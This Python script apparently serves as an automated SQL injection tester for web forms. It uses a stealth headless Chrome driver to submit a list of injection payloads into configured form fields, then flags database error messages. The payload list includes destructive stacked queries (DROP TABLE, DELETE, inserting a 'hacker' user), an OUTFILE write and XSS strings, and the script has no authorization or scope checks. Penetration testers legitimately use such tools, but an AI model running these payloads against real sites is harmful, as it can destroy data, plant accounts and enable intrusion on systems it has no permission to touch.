#!/usr/bin/env python3
import json
import random
import logging
import argparse
import time
import sys
import os
import re
from datetime import datetime
import undetected_chromedriver as uc
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    datefmt='%Y-%m-%d %H:%M:%S'
)

# Load configuration files
try:
    with open('form_config.json', 'r') as f:
        FORM_CONFIG = json.load(f)
except Exception as e:
    logging.error(f"Error loading form configuration: {e}")
    sys.exit(1)

# SQL Injection Payloads
SQL_INJECTION_PAYLOADS = [
    # Basic SQL injection tests
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR '1'='1'; --",
    "admin' --",
    "admin' #",
    "' UNION SELECT 1, 'aaa', 'bbb', 1 --",
    "' UNION SELECT NULL, NULL, NULL, NULL --",
    
    # Error-based SQL injection
    "' AND 1=CONVERT(int,(SELECT @@VERSION)) --",
    "' AND 1=CONVERT(int,'a') --",
    "' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers as sys4, sysusers as sys5, sysusers as sys6, sysusers as sys7) --",
    
    # Time-based SQL injection
    "'; WAITFOR DELAY '0:0:5' --",
    "'; IF 1=1 WAITFOR DELAY '0:0:5' --",
    
    # Stacked queries
    "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
    "'; DELETE FROM users WHERE username='test'; --",
    "'; DROP TABLE users; --",
    
    # More complex payloads
    "' AND (SELECT 'x' FROM USERS WHERE 1=1 AND ROWNUM<2) IS NOT NULL --",
    "' HAVING 1=1 --",
    "' GROUP BY columnnames HAVING 1=1 --",
    "' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'tablename') --",
    
    # NoSQL injection
    "' || 1==1",
    "' && 1==1",
    "'; return true; var foo='",
    "'; return false; var foo='",
    
    # Special characters
    "' OR '1'='1' #",
    "' OR '1'='1' %00",
    "' OR '1'='1' %16",
    
    # XSS combined with SQLi
    "'><script>alert(1)</script>",
    "' UNION SELECT '<script>alert(1)</script>', NULL, NULL, NULL --",
    
    # Unicode/alternative encoding
    "'%20OR%20'1'%3D'1'",
    "' UNION%20SELECT%20'1'%2C'2'%2C'3'%2C'4'--",
    
    # Edge cases
    "1'; DROP TABLE users--",
    "1' OR '1' = '1')) LIMIT 1/*",
    "' OR 1=1 INTO OUTFILE '/tmp/test.txt' --",
    "' OR 1=1 LIMIT 1 --"
]

def setup_driver():
    """Set up and configure the undetected Chrome WebDriver."""
    try:
        options = webdriver.ChromeOptions()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        driver = uc.Chrome(options=options)
        driver.set_window_size(1920, 1080)
        return driver
    except Exception as e:
        logging.error(f"Failed to set up WebDriver: {e}")
        sys.exit(1)

def test_form_for_sql_injection(form_config_name):
    """Test a form for SQL injection vulnerabilities."""
    if form_config_name not in FORM_CONFIG:
        logging.error(f"Form configuration '{form_config_name}' not found")
        sys.exit(1)
    
    config = FORM_CONFIG[form_config_name]
    url = config.get('url', None)
    if not url:
        logging.error("No URL specified in form configuration")
        sys.exit(1)
    
    fields = config.get('fields', {})
    if not fields:
        logging.error("No form fields specified in configuration")
        sys.exit(1)
    
    # Set up the WebDriver
    logging.info(f"Testing form '{form_config_name}' for SQL injection vulnerabilities")
    logging.info(f"Target URL: {url}")
    
    driver = setup_driver()
    
    # Track results
    total_tests = 0
    suspicious_responses = []
    
    try:
        # For each text field, test with SQL injection payloads
        text_fields = {name: field for name, field in fields.items() 
                      if name not in ['submit_button'] and field.get('type') != 'checkbox'}
        
        for field_name, field_config in text_fields.items():
            selector = field_config.get('selector')
            selector_type = field_config.get('type', 'css')
            
            if not selector:
                continue
            
            logging.info(f"Testing field '{field_name}' with selector: {selector}")
            
            # Test each payload
            for payload in SQL_INJECTION_PAYLOADS:
                total_tests += 1
                logging.info(f"Testing payload #{total_tests}: {payload}")
                
                # Load the page
                driver.get(url)
                time.sleep(2)  # Wait for page to load
                
                # Find and fill the field
                by_type = By.CSS_SELECTOR if selector_type == 'css' else By.XPATH
                
                try:
                    element = WebDriverWait(driver, 10).until(
                        EC.presence_of_element_located((by_type, selector))
                    )
                    element.clear()
                    element.send_keys(payload)
                    
                    # Fill other required fields with benign data
                    for other_name, other_field in fields.items():
                        if other_name != field_name and other_name != 'submit_button' and other_field.get('required', False):
                            other_selector = other_field.get('selector')
                            other_type = other_field.get('type', 'css')
                            
                            if not other_selector:
                                continue
                                
                            by_other_type = By.CSS_SELECTOR if other_type == 'css' else By.XPATH
                            try:
                                other_element = WebDriverWait(driver, 5).until(
                                    EC.presence_of_element_located((by_other_type, other_selector))
                                )
                                other_element.clear()
                                other_element.send_keys("test data")
                            except (TimeoutException, NoSuchElementException):
                                logging.warning(f"Could not find element for field '{other_name}'")
                    
                    # Submit the form
                    submit_selector = fields.get('submit_button', {}).get('selector')
                    submit_type = fields.get('submit_button', {}).get('type', 'css')
                    
                    if submit_selector:
                        by_submit_type = By.CSS_SELECTOR if submit_type == 'css' else By.XPATH
                        try:
                            submit_button = WebDriverWait(driver, 5).until(
                                EC.element_to_be_clickable((by_submit_type, submit_selector))
                            )
                            submit_button.click()
                            time.sleep(2)  # Wait for form submission
                        except (TimeoutException, NoSuchElementException):
                            logging.warning("Could not find submit button")
                    
                    # Check for signs of successful SQL injection
                    page_source = driver.page_source.lower()
                    error_patterns = [
                        'sql syntax', 'unclosed quotation', 'unterminated string',
                        'sql error', 'syntax error', 'mysql error', 'postgresql error',
                        'database error', 'odbc driver', 'ora-', 'line \d+', 'syntax error',
                        'unexpected end', 'warning:', 'invalid query', 'sql state',
                        'microsoft sql', 'postgres error', 'mysqli', 'mysql_query'
                    ]
                    
                    for pattern in error_patterns:
                        if re.search(pattern, page_source):
                            alert_message = f"POTENTIAL SQL INJECTION VULNERABILITY DETECTED! Field: {field_name}, Payload: {payload}"
                            logging.critical(alert_message)
                            suspicious_responses.append({
                                'field': field_name,
                                'payload': payload,
                                'pattern_matched': pattern,
                                'url': url
                            })
                            break
                    
                except (TimeoutException, NoSuchElementException) as e:
                    logging.warning(f"Could not find element for field '{field_name}': {e}")
                except Exception as e:
                    logging.error(f"Error testing payload on field '{field_name}': {e}")
                
                # Brief pause between tests
                time.sleep(1)
    
    except Exception as e:
        logging.error(f"Error during SQL injection testing: {e}")
    finally:
        driver.quit()
    
    # Generate report
    logging.info(f"SQL Injection testing completed: {total_tests} tests executed")
    
    if suspicious_responses:
        logging.critical(f"FOUND {len(suspicious_responses)} POTENTIAL SQL INJECTION VULNERABILITIES!")
        for i, vuln in enumerate(suspicious_responses, 1):
            logging.critical(f"Vulnerability #{i}:")
            logging.critical(f"  Field: {vuln['field']}")
            logging.critical(f"  Payload: {vuln['payload']}")
            logging.critical(f"  Pattern Matched: {vuln['pattern_matched']}")
            logging.critical(f"  URL: {vuln['url']}")
    else:
        logging.info("No obvious SQL injection vulnerabilities detected")

def main():
    parser = argparse.ArgumentParser(description="SQL Injection Tester for Web Forms")
    parser.add_argument('--config', '-c', type=str, default=os.environ.get('FORM_CONFIG', 'default'),
                        help="Form configuration to use (default: from FORM_CONFIG env var or 'default')")
    args = parser.parse_args()
    
    test_form_for_sql_injection(args.config)

if __name__ == "__main__":
    main() 